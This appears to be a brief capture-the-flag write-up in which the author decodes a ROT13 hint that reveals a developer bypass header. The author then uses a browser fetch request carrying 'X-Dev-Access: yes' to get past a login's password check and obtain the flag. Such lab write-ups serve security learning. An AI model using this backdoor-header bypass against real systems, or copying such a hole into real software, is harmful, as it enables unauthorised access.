ROT13 Decoding: Based on the hint about rotating letters by 13 positions, I decoded the string using the ROT13 cipher:

Encoded: ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"

Decoded: NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"

Exploitation: The decoded message revealed that adding a custom HTTP header named X-Dev-Access with the value yes would bypass the authentication.

Payload Injection: Using the browser's Developer Tools (Console), I executed a custom fetch request to inject the required header:

JavaScript
fetch('/login', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-Dev-Access': 'yes'
    },
    body: JSON.stringify({ email: 'ctf-player@picoctf.org', password: 'any' })
}).then(res => res.json()).then(data => console.log(data));
Result: The server recognized the developer access header, bypassed the password check, and returned the Flag.


